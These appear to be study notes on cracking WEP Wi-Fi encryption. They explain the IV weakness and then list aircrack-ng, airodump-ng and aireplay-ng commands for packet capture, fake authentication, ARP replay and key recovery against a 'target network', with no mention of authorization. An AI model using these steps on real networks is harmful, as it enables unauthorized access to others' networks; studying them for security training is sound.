Gaining access : WEP Cracking :
			> Wired Equivalent privacy
			> old encryption
			> uses an algo called RC4
			> still used in some n/w
			> can be cracked easily.
		
How it works : 
	> client encrypts data using a key
	> encrypted packet is sent in the air
	> Router decrypts packet using the key.
	
	In detail: > Each packet is encrypted using a unique key stream.
		   > Random initialization vector (IV) is used to generate the keys streams.
		   > the inilization vector is only 24 bits
		   > IV + Key (Password) = Key stream.
	
	Weakness: IV is too small
	          IV is sent in plain text
	          
	Results : IV's will repeat on bussy network.
		  This makes WEp vulnerable to statistical attacks.
		  Repeated IV's can be used to determine the key stream.
		  and break the encryption.

Break the WEP security of a desired network : airodump-ng --bssid "- - -" --channel " " --write basic_wep(file name) wlan0
(we are intrested in  .cap file )
once we get the file: > do -- ls
		      > run command - aircrack-ng "file name"
		      > on successful run we will get an ASCII Password.
		      > if you dont get the ASCII password then yoou get a KEY FOUND we can also connect to the n/w using that key.
		      > Copy the key found paste it in command prompt and removet the colons in betn the numbers. (eg 41:73:32:33:70 --> 4173323370)
		      > Now go to the host machine enter the KEY with removed colons and try connecting to the desired network.

WEP Cracking:
We can face one problem above is that if network is busy then it would take somme time to capture enough IVs.

So the solution to it is we force AP to generate new IVs.

Now how do we do it ?? 

FAKE AUTHENTICATION ATTACK: > airodump-ng --bssid "- - -" --channel "- - -" --write arpreplay(file name) wlan0  [ run this command]
			    > now we associate with this network: aireplay-ng --fakeauth 0 -a "bssid" -h "mac address of the wireless adapter" wlan0
			    > replace the - in mac address of wireless adapter by : 
			    > NOW WE COMMUNICATE WITH THE TARGET NETWORK IN ORDER TO GENERATE THE KEY.
			    > NOW we do an arpreplay attack : aireplay-ng --arpreplay -b bssid -h mac address of router wlan0
			    > wait for ARP packet to be generated once it is done we are ready to gain access 
			    > now run : aircrack-ng arpreplay-01.cap(file name) 
			    > make sure you get enough of data packets generated before running the command 
			    > on successfull run you get the decrypted key and you are ready to get the access of the network.
